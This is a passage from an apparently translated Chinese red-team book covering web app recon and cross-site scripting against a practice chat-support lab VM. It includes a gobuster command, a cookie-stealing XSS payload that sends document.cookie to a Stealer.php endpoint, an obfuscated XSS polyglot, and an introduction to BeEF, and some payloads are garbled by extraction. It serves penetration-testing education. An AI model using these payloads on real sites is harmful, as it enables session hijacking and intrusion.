这些应用程序是非常重要的。例如，一位研究人员发现，弱 NPM 凭证使他能够获取 13% 的 NPM 包的编辑和发布权
限。通过依赖链，预计有52% 的 NPM 包是易受攻击的。 
[https://www.bleepingcomputer.com/news/security/52-percent-of-all-javascript-npm-packages-could-have-be
en-hacked-via-weak-credentials/]
在下面的示例中，我们的实验室将使用 Node.js 作为应用程序的基础，它将使用 Express 框架作为我们的 Web 服务
器。然后，我们将把 Pug 模板引擎添加到我们的 Express 框架中。这类似于我们现在在新开发的应用程序中经常见
到的东西。
Express 是一个用于 Node.js 的极简 Web 框架。Express 为 Web 和移动应用程序提供了一组强大的功能，因此你无
需进行大量工作。使用名为 Middlewares  的模块，你可以添加第三方认证或服务，如 Facebook 身份验证或 Stripe
支付服务。
Pug，正式名称为 Jade，是一个服务器端模板引擎，你可以(但不是必须)与 Express 一起使用它。Jade 用于在服务器
上以编程方式生成 HTML 页面并将其发送给客户机。
让我们开始攻击 CSK 并启动聊天支持系统虚拟机。
Cyber Space Kittens：聊天支持系统
你偶然发现了面向外部网络的 CSK 聊天支持系统。当你慢慢筛选所有页面并了解底层系统时，你会在应用程序中寻
找其弱点。你需要在服务器中找到第一个入口点，以便可以转入入侵生产环境。
你首先浏览了所有漏洞扫描程序和 Web 应用程序扫描程序的报告结果，但是一无所获。看起来这家公司经常运行常
见的漏洞扫描器并修补了大部分问题。现在入侵的关键突破口在于代码问题、错误配置和逻辑缺陷。你还注意到此应
用程序正在运行 NodeJS，这是一种最近很流行的语言。
设置你的 Web 应用程序攻击机器
虽然对于红队要面对的 Web 应用程序，并没有什么完美的入侵方法，但是你需要的一些基本工具包括：
用浏览器武装自己。许多浏览器的行为都非常不同，尤其是复杂的 XSS 规避机制：
Firefox（我的最爱）
Chrome
Safari
Wappalyzer：一种跨平台的实用程序，可以揭示网站上使用的技术。它可以检测内容管理系统，电子商务平
台，Web 框架，服务器软件，分析工具等等。
https://wappalyzer.com/
BuiltWith：一个网站分析工具。在查找页面时，BuiltWith 会返回它在页面上可以找到的所有技术。BuiltWith
的目标是帮助开发人员，研究人员和设计人员找出正在使用的技术页面，这可以帮助他们决定自己采用哪些技
术。
https://builtwith.com/
Retire.JS：扫描 Web 应用程序所使用的易受攻击的 JavaScript 库。Retire.js 的目标是帮助你检测具有已知漏洞
的版本的使用情况。
https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?
Burp Suite（约350美元）：虽然这个商业工具有点贵，但绝对物有所值，对于渗透测试人员和红队队员来说。
它的好处来自附加组件，模块化设计和用户开发基础。如果你买不起 Burp，OWASP ZAP（免费）是一个很好
的替代品。
分析 Web 应用程序
在我们进行任何类型的扫描之前，尝试理解底层代码和基础结构非常重要。我们怎样才能知道后端运行的是什么代
码？我们可以使用 Wappalyzer，BuiltWith 或 Google Chrome 浏览器查看。在下面的图像中，当加载聊天应用程序
时，我们可以在 Chrome 中看到 HTTP 标头具有 X-Powered By: Express。我们还可以在Wappalyzer 中看到应用程
序正在使用 Express 和 Node.js。
盲目攻击网站之前了解目标应用程序可以帮助你提供更好的思路。这也有助于入侵可能有 WAF 的目标站点，允许你
使用更多的攻击手法。
网络探测
在之前的书中，我们详细介绍了如何使用 Burp Suite 以及如何对站点进行渗透测试。我们将跳过很多设置基础知
识，并将更多精力放在攻击网站上。
在这一点上，我们将假设你已经设置好了 Burp Suite（免费或付费），并且你使用的是本书的 Kali 镜像。一旦我们
了解了底层系统，我们就需要识别所有端点。我们仍然需要运行与之前相同的探测工具。
Burp Suite
爬虫：在免费和付费版本中，Burp Suite 都有一个很棒的爬虫工具。
内容探测：如果你使用的是付费版本的 Burp Suite，那么最受欢迎的探测工具之一就是 Discover
Content。这是一个智能高效的工具，可以查找目录和文件。你还可以为扫描指定多种不同的配置。
主动扫描：运行所有参数的自动漏洞扫描并测试多个 Web 漏洞。
OWASP ZAP
类似于 Burp，但完全开源和免费。具有类似的探测和主动扫描功能。
Dirbuster
一个很久以前就被开发出的旧工具，用于发现 Web 应用程序的文件/文件夹，但现在仍然可以顺利的完成
工作。
目标网址：http://chat:3000
字典：
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
GoBuster
非常轻量级、快速的目录和子域名爆破工具
gobuster -u http://chat:3000 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -s
200,301,307 -t 20
你的字典列表非常重要。我最喜欢使用的一个汇总的字典列表是一个名为 raft 的旧字典，它是许多开源项目的集合。
你可以在这里找到这些和其他有价值的字典列表：https://github.com/danielmiessler/SecLists/tree/master/Discov
ery/Web-Content （已包含在本书的 Kali 镜像中）。
现在既然我们已经完成了概述，让我们进行一些攻击吧。从红队的角度来看，我们正在寻找可以主动攻击的漏洞，并
为我们提供最大的帮助。如果我们正在进行评估或渗透测试，我们可能会报告漏洞扫描程序中的 SSL 问题，默认
Apache 页面或其他漏洞扫描程序发现的不可利用的漏洞等。但是，在我们的红队工作中，我们可以完全忽略这些，
并专注于能使我们获得高级访问权限，shell 或 转储 PII 的攻击。
XSS 跨站脚本攻击
在这一点上，我们都曾经见过并利用过跨站点脚本攻击（XSS）。使用传统的 XSS 攻击测试网站上的每个变量的方
式：，对于漏洞赏金平台来说可能很有用，但我们可以做更多吗？我们可以使用哪些工具和方法来更好地利用这些攻
击？
我们都知道 XSS 攻击是客户端攻击，允许攻击者创建特定的 Web 请求从而将恶意代码注入响应中。这通常可以通过
客户机和服务器端的适当输入验证来修复，但这绝不是那么容易。为什么这么说？因为 XSS 漏洞由多种原因造成
的。从编码不规范到不理解框架，有时候应用程序变得过于复杂，就很难理解一个输入点的安全性。
因为仅仅弹窗确实没有真正的危害，让我们从一些基本类型的 XSS 攻击开始：
Cookie 窃取XSS：
document.write('/Stealer.php?cookie='%2B document.cookie %2B 
'"/>'); 
强制下载文件：
重定向用户：
其他脚本以启用键盘记录器，拍照等：
http://www.xss-payloads.com/payloads-list.html?c#category=capture
经过混淆的 XSS payload 和 XSS Polyglot
现在，标准的 XSS payload 通常仍然有效，但我们确实会遇到一些应用程序过滤字符或应用程序有 WAF 防护的情
况。有两个很好的资源可以帮助你开始制作混淆的 XSS payload 攻击：
https://github.com/foospidy/payloads/tree/master/other/xss
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
有时在行动期间，你可能会遇到简单的 XSS 过滤器，它们会查找像   这样的字符串。混淆 XSS payload 是
一种选择，但一定要注意并非所有 JavaScript payload 都需要打开和关闭   标签。有一些 HTML 事件属性
在触发时执行 JavaScript（ https://www.w3schools.com/tags/ref_eventattributes.asp ）。这意味着任何专门针对
Script 标签的规则都是无效的。例如，下列这些执行 JavaScript 的 HTML 事件属性就不使用   标签：
Click Me!
你可以通过访问应用程序来尝试 CSK 应用程序中的每个 HTML 实体攻击：http://chat:3000/ （记得修改
/etc/host  文件以指向与虚拟机 IP 的聊天）。进入后，注册一个帐户，登录应用程序，然后转到聊天功能（ htt
p://chat:3000/chatchannel/1 ）。尝试不同的实体攻击和经过混淆的 payload。
XSS 的其他优秀资源：
第一个是由 @jackmasa 制作的思维导图。这是一个很棒的文档，它根据输入点的位置来分解不同的 XSS
payload。虽然不再在 JackMasa GitHub 页面上，但是这里有一个副本。
另一个很好的资源，讨论哪些浏览器容易受到哪些 XSS payload 的影响：https://html5sec.org/ 。
如你所见，尝试在应用程序上查找每一个 XSS 有时是很烦人的。这是因为易受攻击的参数受到代码功能、不同类型
的 HTML 标记、应用程序类型和不同类型的过滤的影响。试图找到初始 XSS 的弹出窗口可能需要很长时间。如果我
们可以尝试将多个 payload 链接到单个请求中，该怎么办？
最后一种类型的 payload 称为 Polyglot。Polyglot payload 采用许多不同类型的 payload 和混淆技术，并将它们编
译成一次攻击。这适用于想使用自动脚本查找 XSS、时间有限的的漏洞赏金项目，或者仅仅想要快速发现输入验证存
在哪些问题等情况。
因此，我们可以像（ http://bit.ly/2GXxqxH ）这样构建一个 Polyglot，而不是普通的  ：
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() 
)//%0D%0A%0d%0a//\x3csVg/\x3e 
如果你看一下上面的 payload,此攻击试图不使用尖括号，点和斜线的传统攻击代码；执行 onclick XSS；关闭多个标
签；最后尝试一个 onload XSS。这些类型的攻击使 Polyglots 在识别 XSS 方面非常有效和高效。你可以在此处阅读
有关这些 Polyglot XSS 的更多信息：https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Po
lyglot 。
如果你想测试和使用不同的 polyglots，可以从易受攻击的 XSS 页面（ http://chat:3000/xss ）或整个聊天应用程序
开始。
BeEF
浏览器漏洞利用框架（ http://beefproject.com/ ）或简称 BeEF 将 XSS 攻击提升到另一个层次。此工具将
JavaScript payload 注入受害者的浏览器，该浏览器会感染用户的系统。这会在受害者的浏览器上创建一个 C2通
道，用于 JavaScript 后期利用。
对红队来说，BeEF 是一个很好的工具，可用于入侵活动，跟踪用户，捕获凭据，执行点击劫持，使用 Tabna 进行攻
击等等。如果不在攻击期间使用，BeEF 也是一个很好的工具，可以展示 XSS 漏洞的强大功能。这也有助于更复杂的
攻击，我们将在后面的 Blind XSS 小节下讨论。
BeEF 分为两部分：一部分是服务器，另一部分是攻击 payload。要启动服务器：
在你的攻击者 Kali 主机上启动 BeEF
打开终端